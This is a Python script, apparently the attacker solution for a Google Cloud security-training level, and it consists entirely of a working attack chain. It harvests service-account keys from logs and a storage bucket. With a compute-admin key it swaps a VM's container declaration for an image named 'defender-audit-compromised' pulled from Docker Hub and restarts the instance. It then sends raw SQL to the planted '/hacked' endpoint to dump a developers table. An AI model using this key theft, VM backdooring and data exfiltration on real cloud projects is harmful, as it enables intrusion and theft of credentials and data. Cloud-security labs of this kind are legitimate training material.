import random
import sys
import os
import subprocess
import time
import json
import csv
import sqlalchemy
import google.auth
import requests
import shutil

from googleapiclient import discovery
from sqlalchemy.sql import text
from google.oauth2 import service_account, id_token
from core.framework import levels
from google.cloud import storage, logging as glogging
from core.framework.cloudhelpers import (
    deployments,
    iam,
    gcstorage,
    cloudfunctions
)
import google.auth.transport.requests
from google.auth.transport.requests import AuthorizedSession


def exploit(nonce):
    credentials, project_id = google.auth.default()
    logging_key = iam.generate_service_account_key('log-viewer')
    logging_client = glogging.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(logging_key)))
    logger = logging_client.logger('rmUser')
    logs = logger.list_entries()
    dev_key = list(logs)[-1].payload['auth']
    storage_client = storage.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(dev_key)))
    blobs = list(storage_client.list_blobs(f'vm-image-bucket-{nonce}'))
    temp_dir = 'test/' ###TODO change me
    os.mkdir(temp_dir)
    for blob in blobs:
        blob.download_to_filename(f'{temp_dir}{blob.name}')

    with open(f'{temp_dir}compute-admin.json') as keyfile:    
        compute_admin_key = json.loads(keyfile.read())
    
    compute_api = discovery.build('compute', 'v1', credentials=service_account.Credentials.from_service_account_info(compute_admin_key))
    api_instance = compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()
    new_gce = '''
    metadata:
      name: a6
    spec:
      containers:
      - image: docker.io/aujxn/defender-audit-compromised:latest
        imagePullPolicy: Always
        name: a6
        ports:
        - containerPort: 80
          hostPort: 80
        volumeMounts: []
      volumes: []

  '''
    fingerprint = api_instance['metadata']['fingerprint']
    payload = {'fingerprint': fingerprint, 'items': [{'key': 'gce-container-declaration', 'value': new_gce}]}
    compute_api.instances().setMetadata(project='atomic-hash-305702', zone='us-west1-b', instance='api-engine', body=payload).execute()
    compute_api.instances().stop(project='atomic-hash-305702', zone='us-west1-b', instance='api-engine').execute()
    while(compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['status'] != 'TERMINATED'):
        time.sleep(2)
    print('compute terminated')
    compute_api.instances().start(project='atomic-hash-305702', zone='us-west1-b', instance='api-engine').execute()
    while(compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['status'] != 'RUNNING'):
        time.sleep(2)
    print('compute started')
    shutil.rmtree(temp_dir)

def hack():
    credentials, project_id = google.auth.default()
    compute_api = discovery.build('compute', 'v1', credentials=credentials)
    response = compute_api.instances().list(project=project_id, zone='us-west1-b').execute()

    for instance in response['items']:
        if instance['name'] == 'api-engine':            
            hostname = instance['networkInterfaces'][0]['accessConfigs'][0]['natIP']
            break

    url = f'http://{hostname}/hacked'

    payload = {'sql': 'select * from devs;'}
    response = requests.post(url, data=payload)
    print(response.text)

#exploit('396535945103')

hack()